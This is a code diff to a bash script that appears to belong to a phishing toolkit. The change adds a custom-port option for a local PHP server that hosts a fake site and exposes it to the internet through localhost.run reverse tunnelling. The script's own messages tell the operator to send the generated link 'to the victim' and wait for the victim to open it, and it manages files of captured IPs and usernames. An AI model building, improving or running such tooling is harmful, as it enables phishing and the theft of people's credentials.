@@ -397,18 +397,28 @@ start() {
     printf "\n"
     printf "1. \e[1;94mLocalhost.run\e[0m\n"  # Adding color to "Localhost.run"
     echo ""
-   read -p $'\n\e[1;92m┌──[ Choose the tunneling method: ]──┐\e[0m\n\e[1;92m│                                   │\e[0m\n\e[1;92m└─► ' host
+    read -p $'\n\e[1;92m┌──[ Choose the tunneling method: ]──┐\e[0m\n\e[1;92m│                                   │\e[0m\n\e[1;92m└─► ' host
 
     if [[ $host == 1 ]]; then
-        xterm -e "bash -c 'printf \"Starting Localhost.run link...\n\"; ssh -R 80:localhost:5555 nokey@localhost.run'" &
+        # Ask user if they want to use the default port
+        read -p $'\n\e[1;92m┌──[ Use default port 5555? (y/n) ]──┐\e[0m\n\e[1;92m│                                   │\e[0m\n\e[1;92m└─► ' use_default_port
+
+        # Set the port based on user's input
+        if [[ $use_default_port == "y" || $use_default_port == "Y" ]]; then
+            port=5555
+        else
+            read -p $'\n\e[1;92m┌──[ Enter custom port: ]──┐\e[0m\n\e[1;92m│                            │\e[0m\n\e[1;92m└─► ' port
+        fi
+
+        xterm -e "bash -c 'printf \"Starting Localhost.run link...\n\"; ssh -R 80:localhost:$port nokey@localhost.run'" &
         sleep 2
-        start_localhostrun
+        start_localhostrun $port
     fi
 }
 
-
-
 start_localhostrun() {
+    local port=$1
+
     while true; do
         if [[ -e sites/$server/ip.txt ]]; then
             rm -rf sites/$server/ip.txt
@@ -417,12 +427,11 @@ start_localhostrun() {
             rm -rf sites/$server/usernames.txt
         fi
 
-        printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-        cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
+        printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server on port $port...\n"
+        cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
         sleep 2
 
         printf "\e[1;92m[\e[0m*\e[1;92m] Please send the following link displayed in the xterm terminal to the victim it is output as: \e[0m\e[1;94mhttps://<link>.lhr.life\e[0m\n"
-
 
         # Waiting for victim to open link
         printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for victim to open the link...\e[0m\n"
@@ -463,6 +472,7 @@ start_localhostrun() {
 
 
 
+
 checkfound() {
     printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
     while [ true ]; do
@@ -477,8 +487,6 @@ checkfound() {
 # Main script starts here
 
 # Remove unnecessary files
-rm -rf setup.sh
-rm -rf tmxsp.sh
 rm -rf index.html
 rm -rf .gitignore
 rm -rf .nojekyll
